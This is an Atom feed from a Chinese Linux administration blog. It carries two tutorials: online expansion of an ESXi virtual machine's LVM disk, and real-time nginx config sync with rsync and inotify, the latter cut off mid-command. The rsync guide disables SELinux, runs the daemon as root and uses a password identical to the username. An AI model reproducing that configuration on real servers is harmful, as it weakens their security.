<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Netb2c&#39;s Blog</title>
  
  <subtitle>We&#39;d better struggle for the future rather than regret for the past.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.unixmen.cn/"/>
  <updated>2018-06-11T14:53:04.000Z</updated>
  <id>http://blog.unixmen.cn/</id>
  
  <author>
    <name>Netb2c</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ESXI虚拟机磁盘在线扩容</title>
    <link href="http://blog.unixmen.cn/2018/06/12/ESXI%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E5%9C%A8%E7%BA%BF%E6%89%A9%E5%AE%B9/"/>
    <id>http://blog.unixmen.cn/2018/06/12/ESXI虚拟机磁盘在线扩容/</id>
    <published>2018-06-11T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>内网有一台ESXI上的虚拟机，用来做构建服务的，因为构建项目逐渐增加，磁盘空间渐渐不足，严重影响使用。<br>为解决问题，当务之急是将磁盘分区进行扩容，因为磁盘分区做的LVM，可以很方便的动态扩容，在物理机上可以通过加硬盘的方式来解决问题，而ESXI的虚拟机就更方便了，直接将虚拟机关机修改磁盘大小即可，但是修改完的硬盘空间并不会自动扩展到磁盘分区中，还需要我们做一些操作才可以使用，具体操作如下：</p><h1 id="1-创建新分区"><a href="#1-创建新分区" class="headerlink" title="1. 创建新分区"></a><strong>1. 创建新分区</strong></h1><p>ESXI修改完磁盘大小后，增加的磁盘空间表现为当前磁盘剩余未分配空间，需要使用剩余未分配空间新建分区<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> fdisk /dev/sda</span><br><span class="line">n       （新建分区）</span><br><span class="line">p       （选择分区类型主分区或扩展分区）</span><br><span class="line">3       （选择分区编号）</span><br><span class="line">回车</span><br><span class="line">回车</span><br><span class="line">t（修改分区类型）</span><br><span class="line">3（选择分区）</span><br><span class="line">8e（Changed type of partition 'Linux' to 'Linux LVM'，修改成LVM类型）</span><br><span class="line">w（写分区表退出）</span><br></pre></td></tr></table></figure></p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用命令重新读取分区表，或者重启机器</span><br><span class="line"><span class="meta">#</span> partprobe</span><br><span class="line">Warning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.</span><br><span class="line"></span><br><span class="line">Centos6系统上使用</span><br><span class="line"><span class="meta">#</span> partx</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">格式化新磁盘分区</span><br><span class="line">xfs文件系统</span><br><span class="line"><span class="meta">#</span> mkfs.xfs /dev/sda3       （此处分区格式要与已有的LVM卷中分区格式一致）</span><br><span class="line">EXT4文件系统</span><br><span class="line"><span class="meta">#</span> mkfs.ext4 /dev/sda3</span><br></pre></td></tr></table></figure><h1 id="2-添加新LVM分区到已有的LVM组，实现扩容"><a href="#2-添加新LVM分区到已有的LVM组，实现扩容" class="headerlink" title="2. 添加新LVM分区到已有的LVM组，实现扩容"></a><strong>2. 添加新LVM分区到已有的LVM组，实现扩容</strong></h1><p>进入LVM管理<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> lvm</span><br><span class="line"><span class="meta">lvm&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化新分区</span><br><span class="line"><span class="meta">lvm&gt;</span> pvcreate /dev/sda3</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看卷组名</span><br><span class="line"><span class="meta">lvm&gt;</span> vgdisplay </span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               test_build</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将初始化过的分区加入到虚拟卷组</span><br><span class="line"><span class="meta">lvm&gt;</span> vgextend test_build /dev/sda3</span><br><span class="line">  Volume group "test_build" successfully extended</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">扩展已有卷的容量</span><br><span class="line"><span class="meta">lvm&gt;</span> vgdisplay </span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               test_build</span><br><span class="line">  System ID             </span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        2</span><br><span class="line">  Metadata Sequence No  4</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                2</span><br><span class="line">  Open LV               2</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                2</span><br><span class="line">  Act PV                2</span><br><span class="line">  VG Size               &lt;399.53 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              102279</span><br><span class="line">  Alloc PE / Size       51080 / 199.53 GiB</span><br><span class="line">  Free  PE / Size       51199 / &lt;200.00 GiB</span><br><span class="line">  VG UUID               wVZavM-oLX7-iWf1-fKiO-TGVM-Oa0r-2mcTsD</span><br><span class="line"></span><br><span class="line"><span class="meta">lvm&gt;</span> lvextend -l +51199 /dev/mapper/test_build-data</span><br><span class="line">  Size of logical volume test_build/data changed from 152.96 GiB (39159 extents) to 352.96 GiB (90358 extents).</span><br><span class="line">  Logical volume test_build/data successfully resized.</span><br><span class="line">上述参数中，</span><br><span class="line">-l,指定逻辑卷的大小，单位为PE数;</span><br><span class="line">51199为通过vgdisplay命令查询到的卷中空闲空间，目录参数为df命令查询到的需要扩展的挂载点位置。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">查看卷容量</span><br><span class="line"><span class="meta">lvm&gt;</span> pvdisplay</span><br><span class="line">  --- Physical volume ---</span><br><span class="line">  PV Name               /dev/sda2</span><br><span class="line">  VG Name               test_build</span><br><span class="line">  PV Size               199.53 GiB / not usable 3.00 MiB</span><br><span class="line">  Allocatable           yes (but full)</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              51080</span><br><span class="line">  Free PE               0</span><br><span class="line">  Allocated PE          51080</span><br><span class="line">  PV UUID               2gmX3A-Bpz4-hCQ0-5fjr-CiCM-peYZ-BMDi9W</span><br><span class="line">   </span><br><span class="line">  --- Physical volume ---</span><br><span class="line">  PV Name               /dev/sda3</span><br><span class="line">  VG Name               test_build</span><br><span class="line">  PV Size               200.00 GiB / not usable 4.00 MiB</span><br><span class="line">  Allocatable           yes (but full)</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              51199</span><br><span class="line">  Free PE               0</span><br><span class="line">  Allocated PE          51199</span><br><span class="line">  PV UUID               wJe39M-0326-n2Ge-6m2d-IlTR-Gubg-UXRhie</span><br><span class="line"></span><br><span class="line"><span class="meta">lvm&gt;</span> quit</span><br></pre></td></tr></table></figure><h1 id="3-文件系统扩容"><a href="#3-文件系统扩容" class="headerlink" title="3. 文件系统扩容"></a><strong>3. 文件系统扩容</strong></h1><p>卷扩容完成后，系统并不能直接使用扩容空间，还需要将文件系统扩容<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">xfs文件系统</span><br><span class="line"><span class="meta">#</span> xfs_growfs /dev/mapper/test_build-data</span><br><span class="line">meta-data=/dev/mapper/test_build-data isize=512    agcount=4, agsize=10024704 blks</span><br><span class="line">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="line">         =                       crc=1        finobt=0 spinodes=0</span><br><span class="line">data     =                       bsize=4096   blocks=40098816, imaxpct=25</span><br><span class="line">         =                       sunit=0      swidth=0 blks</span><br><span class="line">naming   =version 2              bsize=4096   ascii-ci=0 ftype=1</span><br><span class="line">log      =internal               bsize=4096   blocks=19579, version=2</span><br><span class="line">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="line">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br><span class="line">data blocks changed from 40098816 to 92526592</span><br><span class="line"></span><br><span class="line">EXT4文件系统</span><br><span class="line"><span class="meta">#</span> resize2fs /dev/mapper/test_build-data</span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看分区大小</span><br><span class="line"><span class="meta">#</span> df -hl</span><br><span class="line">Filesystem                   Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/test_build-root   47G  2.3G   45G   5% /</span><br><span class="line">devtmpfs                     908M     0  908M   0% /dev</span><br><span class="line">tmpfs                        920M     0  920M   0% /dev/shm</span><br><span class="line">tmpfs                        920M  8.8M  911M   1% /run</span><br><span class="line">tmpfs                        920M     0  920M   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/test_build-data  353G  456M  353G   1% /data</span><br><span class="line">/dev/sda1                    473M  169M  305M  36% /boot</span><br><span class="line">tmpfs                        184M     0  184M   0% /run/user/0</span><br></pre></td></tr></table></figure><p>扩容成功</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;内网有一台ESXI上的虚拟机，用来做构建服务的，因为构建项目逐渐增加，磁盘空间渐渐不足，严重影响使用。&lt;br&gt;为解决问题，当务之急是将磁盘分区进行扩容，因为磁盘分区做的LVM，可以很方便的动态扩容，在物理机上可以通过加硬盘的方式来解决问题，而ESXI的虚拟机就更方便了，直接将虚拟机关机修改磁盘大小即可，但是修改完的硬盘空间并不会自动扩展到磁盘分区中，还需要我们做一些操作才可以使用，具体操作如下：&lt;/p&gt;
&lt;h1 id=&quot;1-创建新分区&quot;&gt;&lt;a href=&quot;#1-创建新分区&quot; class=&quot;headerlink&quot; title=&quot;1. 创建新分区&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 创建新分区&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;ESXI修改完磁盘大小后，增加的磁盘空间表现为当前磁盘剩余未分配空间，需要使用剩余未分配空间新建分区&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt; fdisk /dev/sda&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n       （新建分区）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p       （选择分区类型主分区或扩展分区）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3       （选择分区编号）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;t	（修改分区类型）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3	（选择分区）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8e	（Changed type of partition &#39;Linux&#39; to &#39;Linux LVM&#39;，修改成LVM类型）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;w	（写分区表退出）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="ESXI" scheme="http://blog.unixmen.cn/categories/Linux/ESXI/"/>
    
    
      <category term="esxi" scheme="http://blog.unixmen.cn/tags/esxi/"/>
    
      <category term="磁盘在线扩容" scheme="http://blog.unixmen.cn/tags/%E7%A3%81%E7%9B%98%E5%9C%A8%E7%BA%BF%E6%89%A9%E5%AE%B9/"/>
    
  </entry>
  
  <entry>
    <title>配置Rsync+inotify实现文件实时同步</title>
    <link href="http://blog.unixmen.cn/2018/06/04/%E9%85%8D%E7%BD%AErsync+inotify%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/"/>
    <id>http://blog.unixmen.cn/2018/06/04/配置rsync+inotify实现文件实时同步/</id>
    <published>2018-06-03T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-项目背景"><a href="#1-项目背景" class="headerlink" title="1. 项目背景"></a><strong>1. 项目背景</strong></h1><blockquote><p>因为工作需要，需部署一套nginx负载均衡群集，群集须保证所有nginx节点配置文件完全一致；要解决不同服务器之间数据一致，一般采用NFS共享文件、DRBD镜像复制或rsync文件同步来实现，相对于rsync，前两者配置稍麻烦，此处我选择rsync文件同步来保证配置文件一致性。</p></blockquote><blockquote><p>rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。但是rsync仅仅是同步工具，并不能做到监控文件变化并实时同步，因此还需要配合inotify来实现文件实时同步。</p></blockquote><blockquote><p>inotify是一种强大的、细粒度的、异步的文件系统事件控制机制。linux内核从2.6.13起，加入了inotify支持，通过inotify可以监控文件系统中添加、删除、修改、移动等各种事件，利用这个内核接口，第三方软件就可以监控文件系统下文件的各种变化情况，而inotify-tools正是实施监控的软件。</p></blockquote><blockquote><p>在这里，我们使用inotify监控文件变化，同时通过脚本来触发rsync将发生变化的文件同步到目标服务器。</p></blockquote><blockquote><p><strong>术语定义：</strong><br>客户端–&gt;源服务器（SRC）<br>服务端–&gt;目标服务器（DEST）</p></blockquote><a id="more"></a><h1 id="2-安装配置rsync"><a href="#2-安装配置rsync" class="headerlink" title="2. 安装配置rsync"></a><strong>2. 安装配置rsync</strong></h1><h2 id="2-1-安装rsync服务"><a href="#2-1-安装rsync服务" class="headerlink" title="2.1 安装rsync服务"></a>2.1 安装rsync服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install -y gcc gcc-c++</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y rsync</span></span><br><span class="line">关闭SELINUX（服务端SELINUX一定要关掉，不然rsync同步的时候会报错）</span><br><span class="line"><span class="meta">#</span><span class="bash"> setenforce 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/selinux/config</span></span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><h2 id="2-2-编辑rsync配置文件"><a href="#2-2-编辑rsync配置文件" class="headerlink" title="2.2 编辑rsync配置文件"></a>2.2 编辑rsync配置文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/rsyncd.conf</span></span><br><span class="line"></span><br><span class="line">uid = root     # 此处的用户及用户组必须要拥有操作待同步文件的权限</span><br><span class="line">gid = root</span><br><span class="line">port = 873     # rsync默认监听端口873，也可以自定义</span><br><span class="line">use chroot = no  </span><br><span class="line">max connections = 5</span><br><span class="line">pid file = /var/run/rsyncd.pid</span><br><span class="line">exclude = lost+found/   # 排除同步文件</span><br><span class="line">transfer logging = yes</span><br><span class="line">timeout = 900</span><br><span class="line">ignore nonreadable = yes</span><br><span class="line">dont compress   = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2</span><br><span class="line"></span><br><span class="line">[nginx_conf]</span><br><span class="line">path = /data/program/nginx/conf/    # rsync服务端数据目录路径，即同步到目标目录后的存放路径，按需配置</span><br><span class="line">comment = nginx_conf  # 此处定义模块名称，这个模块名称在rsync同步命令中需要调用</span><br><span class="line">ignore errors</span><br><span class="line">read only = no</span><br><span class="line">list = yes</span><br><span class="line">auth users = rsync    # 设置执行rsync同步的用户名，此用户名可自定义，不需与系统用户一致，需要与secrets file中设置的用户名匹配</span><br><span class="line">secrets file = /data/program/rsync/rsync_server.passwd  # 用户认证配置文件，保存同步时使用的用户名密码，可设置多个用户名密码</span><br><span class="line">hosts allow = 192.168.2.182  #允许进行同步的客户端地址，可设置多个，用英文逗号分隔</span><br></pre></td></tr></table></figure><h2 id="2-3-编辑rsync用户认证配置文件"><a href="#2-3-编辑rsync用户认证配置文件" class="headerlink" title="2.3 编辑rsync用户认证配置文件"></a>2.3 编辑rsync用户认证配置文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /data/program/rsync/rsync_server.passwd</span></span><br><span class="line">rsync:rsync</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /data/program/rsync/rsync_client.passwd</span></span><br><span class="line">rsync</span><br><span class="line"></span><br><span class="line">双向同步的时候，两台服务器上都需要配置这两个文件。</span><br></pre></td></tr></table></figure><h2 id="2-4-修改配置文件权限"><a href="#2-4-修改配置文件权限" class="headerlink" title="2.4 修改配置文件权限"></a>2.4 修改配置文件权限</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> chmod 600 /data/program/rsync/rsync_server.passwd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod 600 /data/program/rsync/rsync_client.passwd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod 600 /etc/rsyncd.conf</span></span><br></pre></td></tr></table></figure><h2 id="2-5-启动rsync服务"><a href="#2-5-启动rsync服务" class="headerlink" title="2.5 启动rsync服务"></a>2.5 启动rsync服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> rsyncd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start rsyncd</span></span><br></pre></td></tr></table></figure><h2 id="2-6-双向同步配置"><a href="#2-6-双向同步配置" class="headerlink" title="2.6 双向同步配置"></a>2.6 双向同步配置</h2><p>单向同步<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果仅需单向同步，只需要在服务端启动rsyncd服务，客户端无需启动服务，可直接执行rsync命令。</span><br></pre></td></tr></table></figure></p><p>双向同步<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如需双向同步，则需要在两台服务器启动rsyncd服务，两台服务器互为C--&gt;S。</span><br></pre></td></tr></table></figure></p><p>此处我选择双向同步，则需在两台服务器上同时配置服务。</p><h1 id="3-安装配置inotify-tools"><a href="#3-安装配置inotify-tools" class="headerlink" title="3. 安装配置inotify-tools"></a><strong>3. 安装配置inotify-tools</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install -y inotify-tools</span></span><br></pre></td></tr></table></figure><h1 id="4-配置inotify-rsync同步脚本"><a href="#4-配置inotify-rsync同步脚本" class="headerlink" title="4. 配置inotify_rsync同步脚本"></a><strong>4. 配置inotify_rsync同步脚本</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /data/program/rsync/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim inotify_rsync.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line">src=/data/program/nginx/conf              # 需要同步的源路径</span><br><span class="line">des=nginx_conf                            # 目标服务器上rsyncd.conf中定义的名称(comment)</span><br><span class="line">rsync_passwd_file=/data/program/rsync/rsync_client.passwd            # rsync验证的密码文件</span><br><span class="line">ip=192.168.2.182                          # 目标服务器</span><br><span class="line">user=rsync                                # rsyncd.conf中定义的验证用户名(auth users)</span><br><span class="line">include_list=/data/program/rsync/include  #指定同步文件写入列表文件，列表文件路径必须用绝对路径，列表文件中内容用相对路径</span><br><span class="line">log_path=/data/program/rsync/logs/$(date +%Y-%m-%d).log    #同步日志输出到日志文件</span><br><span class="line"></span><br><span class="line">cd $&#123;src&#125;</span><br><span class="line">inotifywait -mrq --format  '%Xe %w%f' -e modify,create,delete,attrib,close_write,move ./ | while read file</span><br><span class="line">do</span><br><span class="line">        INO_EVENT=$(echo $file | awk '&#123;print $1&#125;')      # 把inotify输出切割 把事件类型部分赋值给INO_EVENT</span><br><span class="line">        INO_FILE=$(echo $file | awk '&#123;print $2&#125;')       # 把inotify输出切割 把文件路径部分赋值给INO_FILE</span><br><span class="line">        echo "-------------------------------$(date)------------------------------------"  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">        echo $file  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">        #增加、修改、写入完成、移动进事件</span><br><span class="line">        #增、改放在同一个判断，因为他们都是针对文件的操作，即使是新建目录，要同步的也只是一个空目录，不会影响速度。</span><br><span class="line">        if [[ $INO_EVENT =~ 'CREATE' ]] || [[ $INO_EVENT =~ 'MODIFY' ]] || [[ $INO_EVENT =~ 'CLOSE_WRITE' ]] || [[ $INO_EVENT =~ 'MOVED_TO' ]]         # 判断事件类型</span><br><span class="line">        then</span><br><span class="line">                echo 'CREATE or MODIFY or CLOSE_WRITE or MOVED_TO'  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">                rsync -avrtzopgcRP --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125;  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">        fi</span><br><span class="line">        #删除、移动出事件</span><br><span class="line">        if [[ $INO_EVENT =~ 'DELETE' ]] || [[ $INO_EVENT =~ 'MOVED_FROM' ]]</span><br><span class="line">        then</span><br><span class="line">                echo 'DELETE or MOVED_FROM'  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">                rsync -avrtzopgcRP --delete --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125;  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">        fi</span><br><span class="line">        #修改属性事件 指 touch chgrp chmod chown等操作</span><br><span class="line">        if [[ $INO_EVENT =~ 'ATTRIB' ]]</span><br><span class="line">        then</span><br><span class="line">                echo 'ATTRIB'  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">                if [ ! -d "$INO_FILE" ]</span><br><span class="line">                # 如果修改属性的是目录 则不同步，因为同步目录会发生递归扫描，等此目录下的文件发生同步时，rsync会顺带更新此目录。</span><br><span class="line">                then</span><br><span class="line">                        rsync -avrtzopgcRP --include-from=$&#123;include_list&#125; --exclude=/* --password-file=$&#123;rsync_passwd_file&#125; $(dirname $&#123;INO_FILE&#125;) $&#123;user&#125;@$&#123;ip&#125;::$&#123;des&#125;  &gt;&gt; $&#123;log_path&#125;</span><br><span class="line">                fi</span><br><span class="line">        fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>编辑指定同步文件列表<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /data/program/rsync/include</span></span><br><span class="line">nginx.conf</span><br><span class="line">nginx_conf/</span><br><span class="line">conf.d/</span><br><span class="line"></span><br><span class="line">将指定同步的文件写到该列表文件中，需使用相对路径</span><br></pre></td></tr></table></figure></p><p>给同步脚本添加执行权限<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> chmod +x 